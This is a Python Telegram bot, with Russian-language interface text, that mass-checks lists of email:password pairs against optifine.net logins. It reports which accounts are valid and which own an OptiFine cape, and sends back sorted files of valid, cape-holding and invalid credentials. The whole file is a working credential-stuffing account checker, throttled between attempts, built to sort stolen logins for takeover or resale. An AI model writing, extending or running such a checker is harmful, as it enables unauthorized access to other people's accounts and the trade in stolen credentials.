import os
import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import BufferedInputFile
from checker import OptiFineChecker

BOT_TOKEN = os.getenv("BOT_TOKEN", "")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
checker = OptiFineChecker()

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "\U0001f50d <b>OptiFine Checker Bot</b>\n\n"
        "Отправь .txt файл с аккаунтами:\n"
        "<code>email:password</code>\n\n"
        "Или одну строку <code>email:password</code>\n\n"
        "\u2705 Валидность логина на optifine.net\n"
        "\U0001f451 Наличие плаща OptiFine\n\n"
        "/help - Помощь",
        parse_mode="HTML",
    )


@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    await message.answer(
        "\U0001f4d6 <b>Помощь</b>\n\n"
        "<b>Формат:</b>\n"
        "<code>email@mail.com:password</code>\n\n"
        "<b>Использование:</b>\n"
        "1. Отправь .txt файл с аккаунтами\n"
        "2. Или одну строку email:password\n"
        "3. Жди результат",
        parse_mode="HTML",
    )


@dp.message(F.document)
async def handle_document(message: types.Message):
    doc = message.document
    if not doc.file_name.endswith(".txt"):
        await message.answer("\u274c Отправь .txt файл!")
        return

    file = await bot.download(doc)
    content = file.read().decode("utf-8", errors="ignore")
    lines = [l.strip() for l in content.splitlines() if ":" in l.strip()]

    if not lines:
        await message.answer("\u274c Файл пустой или неверный формат!")
        return

    status_msg = await message.answer(
        f"\U0001f504 Проверяю {len(lines)} аккаунтов...\n\u23f3 Подожди..."
    )

    valid = []
    invalid = []
    errors = []
    capes = []

    for i, line in enumerate(lines):
        parts = line.split(":", 1)
        if len(parts) != 2:
            continue

        email = parts[0].strip()
        password = parts[1].strip()

        if i % 3 == 0:
            try:
                await status_msg.edit_text(
                    f"\U0001f504 Проверка: {i+1}/{len(lines)}\n"
                    f"\u2705 Валид: {len(valid)}\n"
                    f"\u274c Инвалид: {len(invalid)}\n"
                    f"\U0001f451 Плащ: {len(capes)}\n"
                    f"\u26a0\ufe0f Ошибки: {len(errors)}"
                )
            except Exception:
                pass

        result = checker.check_account(email, password)

        if result["status"] == "valid":
            cape_str = "\U0001f451 ПЛАЩ" if result["cape"] else "Без плаща"
            entry = f"{email}:{password} | {cape_str}"
            if result.get("username"):
                entry += f" | Ник: {result['username']}"
            valid.append(entry)
            if result["cape"]:
                capes.append(f"{email}:{password}")
        elif result["status"] == "invalid":
            invalid.append(f"{email}:{password}")
        else:
            errors.append(f"{email}:{password} | {result.get('detail', '')}")

        await asyncio.sleep(2)

    result_text = (
        f"\U0001f4ca <b>Результаты</b>\n\n"
        f"\U0001f4dd Всего: {len(lines)}\n"
        f"\u2705 Валид: {len(valid)}\n"
        f"\u274c Инвалид: {len(invalid)}\n"
        f"\U0001f451 Плащ: {len(capes)}\n"
        f"\u26a0\ufe0f Ошибки: {len(errors)}"
    )
    await status_msg.edit_text(result_text, parse_mode="HTML")

    if valid:
        data = "\n".join(valid).encode("utf-8")
        await message.answer_document(
            BufferedInputFile(data, filename="valid.txt"),
            caption=f"\u2705 Валидные ({len(valid)})",
        )
    if capes:
        data = "\n".join(capes).encode("utf-8")
        await message.answer_document(
            BufferedInputFile(data, filename="capes.txt"),
            caption=f"\U0001f451 С плащом ({len(capes)})",
        )
    if invalid:
        data = "\n".join(invalid).encode("utf-8")
        await message.answer_document(
            BufferedInputFile(data, filename="invalid.txt"),
            caption=f"\u274c Инвалидные ({len(invalid)})",
        )
    if errors:
        data = "\n".join(errors).encode("utf-8")
        await message.answer_document(
            BufferedInputFile(data, filename="errors.txt"),
            caption=f"\u26a0\ufe0f Ошибки ({len(errors)})",
        )


@dp.message(F.text)
async def handle_text(message: types.Message):
    text = message.text.strip()
    if text.startswith("/"):
        return
    if ":" not in text:
        await message.answer(
            "\u274c Формат: <code>email:password</code>", parse_mode="HTML"
        )
        return

    parts = text.split(":", 1)
    email = parts[0].strip()
    password = parts[1].strip()

    msg = await message.answer(
        f"\U0001f504 Проверяю <code>{email}</code>...", parse_mode="HTML"
    )

    result = checker.check_account(email, password)

    if result["status"] == "valid":
        cape = "\U0001f451 Плащ: ДА" if result["cape"] else "\u274c Плащ: НЕТ"
        reply = (
            f"\u2705 <b>ВАЛИД!</b>\n\n"
            f"\U0001f4e7 {email}\n"
            f"\U0001f511 <tg-spoiler>{password}</tg-spoiler>\n"
            f"{cape}"
        )
        if result.get("username"):
            reply += f"\n\U0001f464 Ник: {result['username']}"
        if result.get("details"):
            reply += f"\n\U0001f4cb {result['details']}"
    elif result["status"] == "invalid":
        reply = (
            f"\u274c <b>ИНВАЛИД</b>\n\n"
            f"\U0001f4e7 {email}\n"
            f"\U0001f4ac {result.get('detail', 'Неверный логин/пароль')}"
        )
    else:
        reply = (
            f"\u26a0\ufe0f <b>ОШИБКА</b>\n\n"
            f"\U0001f4e7 {email}\n"
            f"\U0001f4ac {result.get('detail', 'Неизвестная ошибка')}"
        )

    await msg.edit_text(reply, parse_mode="HTML")


async def main():
    log.info("Bot started!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
